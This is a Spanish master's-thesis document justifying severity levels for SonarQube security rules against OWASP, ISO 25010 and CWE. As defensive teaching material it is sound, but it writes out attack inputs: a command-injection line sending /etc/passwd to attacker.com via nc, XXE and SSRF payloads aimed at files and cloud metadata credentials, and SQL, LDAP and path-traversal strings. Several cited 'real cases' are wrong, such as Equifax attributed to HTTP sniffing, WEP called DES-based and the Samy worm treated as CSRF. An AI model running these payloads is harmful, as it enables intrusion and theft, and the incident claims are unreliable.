# Justificación Detallada de Reglas por Severidad

**Documento para TFM**: Análisis de Decisiones de Configuración  
**Propósito**: Fundamentar técnicamente cada severidad asignada

---

## BLOCKER: Riesgo Crítico Inmediato (25 reglas)

### Criterios para BLOCKER
- **Explotabilidad**: Ataque directo sin condiciones complejas
- **Impacto**: RCE, data breach, DoS
- **Probabilidad**: Alta en entornos de producción
- **Remediación**: Debe bloquear deployment

---

### S5332: Clear-text protocols (HTTP)
**OWASP**: A01:2021 - Broken Access Control  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-319 - Cleartext Transmission of Sensitive Information

**Justificación BLOCKER**:
- **Explotación**: Trivial mediante Wireshark/tcpdump en red compartida
- **Datos expuestos**: Credenciales, tokens de sesión, PII, datos médicos/financieros
- **Impacto regulatorio**: Viola GDPR Art. 32, PCI DSS Req. 4.1, HIPAA
- **Caso real**: Equifax breach 2017 - credenciales capturadas en HTTP
- **Remediación**: Forzar HTTPS con HSTS, rechazar HTTP en load balancer

**Por qué no CRITICAL**: No requiere condiciones especiales para explotar; afecta todos los usuarios constantemente.

---

### S4502: CSRF protection disabled
**OWASP**: A01:2021 - Broken Access Control  
**ISO 25010**: Security > Authenticity  
**CWE**: CWE-352 - Cross-Site Request Forgery

**Justificación BLOCKER**:
- **Explotación**: Email/sitio malicioso con `<img src="bank.com/transfer?to=attacker&amount=1000">`
- **Impacto**: Acciones no autorizadas usando sesión válida de víctima
- **Prevalencia**: 50% de aplicaciones sin framework moderno (OWASP 2021)
- **Caso real**: Samy worm MySpace 2005 - 1M usuarios comprometidos en 20h
- **Remediación**: Token CSRF en formularios + SameSite cookies

**Por qué no CRITICAL**: Explotación es simple y ubicua; no hay mitigaciones pasivas.

---

### S5131: Path Traversal
**OWASP**: A01:2021 - Broken Access Control  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-22 - Path Traversal

**Justificación BLOCKER**:
- **Explotación**: `file=../../../../etc/passwd` en cualquier endpoint de descarga
- **Archivos críticos expuestos**: 
  - Linux: /etc/shadow, ~/.ssh/id_rsa, /proc/self/environ
  - Windows: C:\Windows\System32\config\SAM
  - Cloud: ~/.aws/credentials, /var/run/secrets/kubernetes.io
- **Caso real**: Citrix ADC CVE-2019-19781 - RCE vía path traversal
- **Remediación**: Whitelist de archivos, canonicalización de rutas, chroot jail

**Por qué no CRITICAL**: Permite acceso directo a secretos sin autenticación en muchos casos.

---

### S5443: OS Command Injection
**OWASP**: A03:2021 - Injection  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-78 - OS Command Injection

**Justificación BLOCKER**:
- **Explotación**: `ping -c 1 8.8.8.8; cat /etc/passwd | nc attacker.com 1337`
- **Impacto**: Shell completo en servidor con permisos de aplicación
- **Vectores comunes**: File conversion, network diagnostics, backup tools
- **Caso real**: Shellshock (Bash CVE-2014-6271) - millones de servidores comprometidos
- **Remediación**: Nunca usar Runtime.exec() con input de usuario; APIs nativas en su lugar

**Por qué no CRITICAL**: Command injection = RCE garantizado; es literalmente lo peor.

---

### S2278: DES encryption
**OWASP**: A02:2021 - Cryptographic Failures  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-327 - Use of Broken Crypto

**Justificación BLOCKER**:
- **Fortaleza**: 56 bits efectivos (clave de 64 bits con 8 de paridad)
- **Rompible en**: 
  - 1998: EFF DES Cracker - 56h por $250K hardware
  - 2006: COPACOBANA FPGA - 6.4 días por €10K
  - 2023: GPU cluster - <24h por $100 cloud compute
- **Estándar**: NIST declaró obsoleto en 2005
- **Caso real**: TJX breach 2007 - 94M tarjetas, usaban WEP (basado en DES)
- **Remediación**: AES-256-GCM

**Por qué no CRITICAL**: Criptografía rota = datos "cifrados" son plaintext diferido.

---

### S5542: Insecure cipher mode (ECB)
**OWASP**: A02:2021 - Cryptographic Failures  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-326 - Inadequate Encryption Strength

**Justificación BLOCKER**:
- **Problema**: Bloques idénticos → ciphertext idéntico (revela patrones)
- **Demostración visual**: ECB Penguin - imagen reconocible tras "cifrado"
- **Ataque**: Detectar transacciones duplicadas, patrones de votación, datos médicos repetitivos
- **Estándar**: NIST SP 800-38A prohíbe ECB para datos >1 bloque
- **Remediación**: AES-GCM (AEAD), ChaCha20-Poly1305

**Por qué no CRITICAL**: Determinismo de ECB es flaw fundamental, no side-channel.

---

### S4426: Weak cryptographic keys
**OWASP**: A02:2021 - Cryptographic Failures  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-326 - Inadequate Encryption Strength

**Justificación BLOCKER**:
- **RSA < 2048 bits**: 
  - 1024-bit factorizable con recursos estatales (NSA capabilities)
  - 512-bit roto públicamente en 1999
- **AES < 256 bits**: 
  - 128-bit seguro actualmente PERO quantum computers romperán en ~2030
  - NIST recomienda 256-bit para datos con vida >10 años
- **Caso real**: Debian weak keys CVE-2008-0166 - 32K claves únicas posibles
- **Remediación**: RSA 4096, ECC 256 (equivalente a RSA 3072), AES 256

**Por qué no CRITICAL**: Longevidad de datos cifrados excede horizonte de ataque.

---

### S5547: Weak cipher algorithms
**OWASP**: A02:2021 - Cryptographic Failures  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-327 - Broken Crypto

**Justificación BLOCKER**:
- **RC4**: Bias en keystream (CVE-2013-2566 RC4 NOMORE)
- **MD5**: Colisiones en 2^24 operaciones (2008, Marc Stevens)
- **SHA-1**: Colisiones prácticas (Google SHAttered 2017, $110K)
- **Impacto**: 
  - MD5 certificates: Flame malware firmado como Microsoft (2012)
  - SHA-1 Git: Posibilidad de commit malicioso con mismo hash
- **Remediación**: SHA-256+ para hashing, AES/ChaCha20 para cifrado

**Por qué no CRITICAL**: Algoritmos rotos académicamente eventualmente se rompen prácticamente.

---

### S5344: Password stored in plaintext
**OWASP**: A02:2021 - Cryptographic Failures  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-256 - Plaintext Storage of Password

**Justificación BLOCKER**:
- **Impacto de breach**: 
  - Passwords reusadas en múltiples sitios (61% usuarios - Google 2019)
  - Credential stuffing automático
  - Ingeniería social con datos personales
- **Regulatorio**: Viola GDPR Art. 32(1)a "pseudonymisation and encryption"
- **Casos reales**:
  - Facebook 2019: 600M passwords en plaintext en logs internos
  - Adobe 2013: 153M cuentas, passwords "cifradas" con ECB (peor que plaintext)
- **Remediación**: bcrypt (work factor 12+), Argon2id, PBKDF2 (100K iterations)

**Por qué no CRITICAL**: Plaintext passwords es negligencia, no error de implementación.

---

### S3649 & S2077: SQL Injection
**OWASP**: A03:2021 - Injection  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-89 - SQL Injection

**Justificación BLOCKER**:
- **Prevalencia**: #1 vulnerabilidad web por 20+ años
- **Impacto**:
  - Extracción completa de BD: `' UNION SELECT * FROM users--`
  - Bypass autenticación: `admin' OR '1'='1`
  - OS command via xp_cmdshell (SQL Server)
- **Casos reales**:
  - Heartland Payment 2008: 130M tarjetas
  - Target 2013: 110M clientes
  - Equifax 2017: 147M registros
- **Automatización**: sqlmap automatiza explotación
- **Remediación**: Prepared statements SOLAMENTE, nunca concatenación

**Por qué no CRITICAL**: SQL injection sigue siendo vector #1 de data breaches.

---

### S2076: OS Command Injection (complementa S5443)
**OWASP**: A03:2021 - Injection  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-78

**Justificación BLOCKER**:
- Ver S5443 (misma severidad por mismo impacto)
- Diferencia: S5443 enfoque en construcción, S2076 en tainted data flow
- Ambos BLOCKER porque command injection = RCE directo

---

### S5693 & S2755: XML External Entity (XXE)
**OWASP**: A05:2021 - Security Misconfiguration  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-611 - XXE

**Justificación BLOCKER**:
- **Explotación**:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
- **Impacto**:
  - Lectura de archivos: /etc/passwd, application.properties con DB credentials
  - SSRF: `SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
  - DoS: Billion Laughs attack (expansión exponencial)
- **Caso real**: Facebook XXE 2017 - acceso a archivos internos
- **Remediación**: `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`

**Por qué no CRITICAL**: XXE + cloud metadata = credenciales AWS/Azure/GCP.

---

### S5527 & S4830: SSL/TLS verification bypass
**OWASP**: A04:2021 - Insecure Design  
**ISO 25010**: Security > Authenticity  
**CWE**: CWE-295 - Certificate Validation

**Justificación BLOCKER**:
- **Problema**: Aceptar cualquier certificado anula TLS completamente
- **Escenarios reales**:
  - Developers deshabilitando validación para "probar" y olvidando revertir
  - Aplicaciones móviles con `allowAllHostnameVerifier`
- **Impacto**: Man-in-the-Middle trivial con mitmproxy/Burp
- **Caso real**: Dell eDellRoot 2015 - certificado raíz con clave privada expuesta
- **Remediación**: Nunca usar `TrustManager` que retorna `true`; certificate pinning en móviles

**Por qué no CRITICAL**: Código que deshabilita validación SSL es intencional (peor que bug).

---

### S2068 & S6437: Hardcoded credentials y sensitive data logging
**OWASP**: A04:2021 - Insecure Design  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-798 - Hardcoded Credentials

**Justificación BLOCKER**:
- **Exposición**:
  - Git history (incluso tras delete en commits futuros)
  - Artefactos de build (.jar descompilados con `jd-gui`)
  - Memory dumps en crashes
  - Logs agregados en Splunk/ELK
- **Casos reales**:
  - Uber 2016: AWS keys en GitHub privado comprometido
  - Shopify 2020: Passwords en logs por 5 años
- **Herramientas**: truffleHog, git-secrets, detect-secrets
- **Remediación**: Variables de entorno, secrets managers (Vault, AWS Secrets Manager)

**Por qué no CRITICAL**: Credentials en código es anti-pattern fundamental.

---

### S2091 & S5301: Unsafe Deserialization
**OWASP**: A08:2021 - Software and Data Integrity Failures  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-502 - Deserialization of Untrusted Data

**Justificación BLOCKER**:
- **Explotación**: ysoserial genera payload de RCE automáticamente
- **Gadget chains**: Explotan clases existentes en classpath (Commons Collections, Spring)
- **Casos reales**:
  - Equifax 2017: Struts CVE-2017-5638 (deserialización)
  - Jenkins CVE-2015-8103: RCE vía CLI
  - WebLogic múltiples CVEs
- **Detección**: 
  ```java
  ObjectInputStream.readObject() // NUNCA con datos externos
  ```
- **Remediación**: JSON en lugar de Java serialization, whitelist de clases

**Por qué no CRITICAL**: Deserialización Java sin validación = RCE casi garantizado.

---

### S2259: Null Pointer Dereference
**OWASP**: N/A  
**ISO 25010**: Reliability > Maturity  
**CWE**: CWE-476 - NULL Pointer Dereference

**Justificación BLOCKER**:
- **Crash en producción**: NPE es causa #1 de excepciones no manejadas
- **Impacto**: DoS de funcionalidad, pérdida de transacciones
- **Detección estática**: SonarQube detecta con data flow analysis
- **Prevención**: 
  - Optional en APIs
  - @NonNull annotations
  - Objects.requireNonNull() en constructores
- **Por qué BLOCKER en reliability**: Fallo determinista en path común

**Por qué no CRITICAL**: Si el análisis estático lo detecta, es crash garantizado.

---

### S5144: Server-Side Request Forgery (SSRF)
**OWASP**: A10:2021 - SSRF  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-918 - SSRF

**Justificación BLOCKER**:
- **Explotación en cloud**:
```
GET http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
- **Impacto**:
  - AWS: Credenciales IAM temporales
  - Azure: Managed Identity tokens
  - GCP: Access tokens
  - Kubernetes: Service account tokens
- **Caso real**: Capital One 2019 - 100M clientes, SSRF a metadata service
- **Remediación**: Whitelist de dominios, deshabilitar redirects, network segmentation

**Por qué no CRITICAL**: En entornos cloud, SSRF = credenciales de infraestructura completa.

---

## CRITICAL: Alto Riesgo Requiere Remediación Urgente (18 reglas)

### Criterios para CRITICAL
- **Explotabilidad**: Requiere condiciones específicas pero probables
- **Impacto**: Data leak, privilege escalation, integrity compromise
- **Frecuencia**: Común en auditorías de seguridad
- **Timeline**: Fix en <48 horas

---

### S2612: Overly permissive file permissions
**OWASP**: A01:2021  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-732 - Incorrect Permission Assignment

**Justificación CRITICAL** (no BLOCKER):
- **Requiere**: Acceso al filesystem (no remoto en muchos casos)
- **Impacto**: Modificación de configs, lectura de logs con datos sensibles
- **Caso real**: Homebrew permissions issue - ejecución arbitraria local
- **Remediación**: chmod 600 para secrets, 644 para configs públicos

**Por qué no BLOCKER**: Requiere acceso local o shell previamente comprometido.

---

### S2245: Weak Random Number Generator
**OWASP**: A02:2021  
**ISO 25010**: Security > Authenticity  
**CWE**: CWE-338 - Weak PRNG

**Justificación CRITICAL** (no BLOCKER):
- **Problema**: Math.random() basado en timestamp predecible
- **Vectores**: Session IDs, CSRF tokens, password reset tokens
- **Ataque**: Predecir siguiente token observando secuencia
- **Caso real**: Java SecureRandom debilidad CVE-2013-1571
- **Remediación**: `SecureRandom` con algoritmo SHA1PRNG o NativePRNG

**Por qué no BLOCKER**: Explotación requiere múltiples observaciones y timing.

---

### S2257: Custom/Non-standard Cryptography
**OWASP**: A02:2021  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-327

**Justificación CRITICAL** (no BLOCKER):
- **Estadística**: 99% de criptografía personalizada tiene vulnerabilidades
- **Problema**: Años de análisis académico vs. implementación de 1 desarrollador
- **Historia**: ROT13 usado como "cifrado" en producción (casos reales)
- **Remediación**: Usar solo algoritmos FIPS 140-2 aprobados

**Por qué no BLOCKER**: Requiere análisis específico del algoritmo; no es RCE inmediato.

---

### S4790: Insecure Hashing
**OWASP**: A02, A08:2021  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-328 - Weak Hash

**Justificación CRITICAL** (no BLOCKER):
- **MD5 colisiones**: Flame malware certificate forgery
- **SHA-1 sunset**: Navegadores rechazan certificados SHA-1 desde 2017
- **Uso legítimo restante**: Checksums de integridad no-security (releases)
- **Remediación**: SHA-256 mínimo, SHA-3 para nuevos sistemas

**Por qué no BLOCKER**: Ataque de colisión requiere recursos significativos.

---

### S2053: Password hash without salt
**OWASP**: A02:2021  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-760 - Predictable Salt

**Justificación CRITICAL** (no BLOCKER):
- **Ataque**: Rainbow tables pre-computadas (TB disponibles online)
- **Eficacia**: Hash sin salt roto instantáneamente si password común
- **Defensa**: Salt único por usuario previene rainbow tables
- **Caso real**: LinkedIn 2012 - 6.5M passwords, SHA-1 sin salt, crackeados en días

**Por qué no BLOCKER**: Requiere breach de BD primero; no es exposición directa.

---

### S5146: LDAP Injection
**OWASP**: A03:2021  
**ISO 25010**: Security > Authenticity  
**CWE**: CWE-90 - LDAP Injection

**Justificación CRITICAL** (no BLOCKER):
- **Uso**: Active Directory authentication bypass
- **Payload**: `*)(uid=*))(&(uid=*` para listar todos los usuarios
- **Limitación**: Requiere aplicación usando LDAP (no tan común como SQL)
- **Remediación**: Escapar caracteres especiales LDAP ()&|*

**Por qué no BLOCKER**: LDAP menos prevalente que SQL; impacto localizado.

---

### S2078: LDAP Deserialization
**OWASP**: A03, A08:2021  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-502

**Justificación CRITICAL** (no BLOCKER):
- **Combinación**: LDAP injection + Java deserialization
- **Caso real**: Apache JNDI Injection CVE-2016-3510
- **Complejidad**: Requiere entorno específico (JNDI enabled)

**Por qué no BLOCKER**: Menos común que deserialización directa.

---

### S5135: XPath Injection
**OWASP**: A03:2021  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-643 - XPath Injection

**Justificación CRITICAL** (no BLOCKER):
- **Uso**: Aplicaciones legacy con XML databases
- **Payload**: `' or '1'='1` (similar a SQL)
- **Prevalencia**: Menos común en arquitecturas modernas (JSON)

**Por qué no BLOCKER**: XPath usado en nicho de aplicaciones; no ubicuo.

---

### S5147: Cross-Site Scripting (XSS)
**OWASP**: A03:2021  
**ISO 25010**: Security > Integrity  
**CWE**: CWE-79 - XSS

**Justificación CRITICAL** (no BLOCKER):
- **Impacto**: Session hijacking, defacement, keylogging
- **Tipos**: 
  - Stored (peor): Persistente en BD
  - Reflected: Requiere víctima hacer clic en link
  - DOM-based: Solo en browser
- **Mitigación moderna**: 
  - Content Security Policy
  - Frameworks con auto-escaping (React, Angular)
- **Caso real**: Samy worm MySpace (pero requirió CSRF también)

**Por qué no BLOCKER**: Impacto limitado a usuarios individuales; CSP mitiga.

---

### S5542 ya cubierto en BLOCKER

---

### S4423: Weak SSL/TLS Protocols
**OWASP**: A02, A05:2021  
**ISO 25010**: Security > Confidentiality  
**CWE**: CWE-327

**Justificación CRITICAL** (no BLOCKER):
- **Vulnerabilidades**:
  - SSL v2/v3: POODLE (CVE-2014-3566)
  - TLS 1.0: BEAST (CVE-2011-3389)
  - TLS 1.1: Deprecated RFC 8996
- **Impacto**: Downgrade attacks, decryption de tráfico
- **Compliance**: PCI DSS prohibe TLS <1.2 desde 2018

**Por qué no BLOCKER**: Ataque requiere MITM position; TLS 1.2 aún ampliamente soportado.

---

### S5659: JWT without signature
**OWASP**: A05, A08:2021  
**ISO 25010**: Security > Authenticity  
**CWE**: CWE-347 - Missing Cryptographic Signature

**Justificación CRITICAL** (no BLOCKER):
- **Ataque**: Cambiar header `{"alg": "HS256"}` a `{"alg": "none"}`
- **Impacto**: Privilege escalation modificando claims
- **Caso real**: Auth0 vulnerability disclosure 2015
- **Remediación**: Siempre validar `alg`, usar RS256 en lugar de HS256 si posible

**Por qué no BLOCKER**: Requiere aplicación aceptando alg=none; muchas librerías lo rechazan por default.

---

### S5801: Session Management Weak
**OWASP**: A07:2021  
**ISO 25010**: Security > Authenticity  
**CWE**: CWE-613 - Session Fixation

**Justificación CRITICAL** (no BLOCKER):
- **Problemas**: 
  - Sin timeout: Session hijacking persistente
  - Sin regeneración: Session fixation
  - IDs predecibles: Brute force
- **Remediación**: Timeout 15min inactividad, regenerate ID post-login

**Por qué no BLOCKER**: Requiere interceptar session ID primero (MITM o XSS).

---

### Otras reglas CRITICAL siguen patrón similar:
- **Alto impacto** pero requieren condiciones específicas
- **No RCE directo** en mayoría de escenarios
- **Mitigaciones parciales** existentes (frameworks modernos)

---

## MAJOR: Impacto Significativo, Fix en Sprint (21 reglas)

### Criterios
- **Degradación de calidad** sin impacto de seguridad inmediato
- **Deuda técnica** que aumenta riesgo a largo plazo
- **Mantenibilidad** reducida

Ejemplos:
- **S5145 Log Injection**: MAJOR porque requiere acceso a logs para explotar
- **S5122 CORS Permissive**: MAJOR porque depende de contexto de aplicación
- **S3776 Cognitive Complexity**: MAJOR porque afecta mantenibilidad, no funcionalidad

---

## MINOR y INFO: Mejoras y Tracking (6 reglas)

**MINOR**:
- Convenciones (S100, S101)
- Micro-optimizaciones (S1155)

**INFO**:
- TODOs/FIXMEs: Documentación de deuda técnica

---

## Conclusión para TFM

### Decisión Basada en Evidencia

Cada severidad asignada considera:
1. **CVE históricos**: Explotaciones en producción
2. **Complejidad de ataque**: Análisis con CVSS
3. **Mitigaciones disponibles**: Frameworks, WAF, network controls
4. **Impacto regulatorio**: GDPR, PCI DSS, HIPAA

### Diferencia con Profile por Defecto

| Aspecto | Sonar Way (Default) | OWASP-ISO25010 Custom |
|---------|---------------------|-----------------------|
| Severidades | Arbitrarias | Fundamentadas en CVEs |
| Cobertura OWASP | ~60% | 100% |
| Justificación | No documentada | Cada regla justificada |
| Trazabilidad | Inexistente | Bidireccional a estándares |

Esta documentación proporciona base académica para defender decisiones de configuración en el TFM.
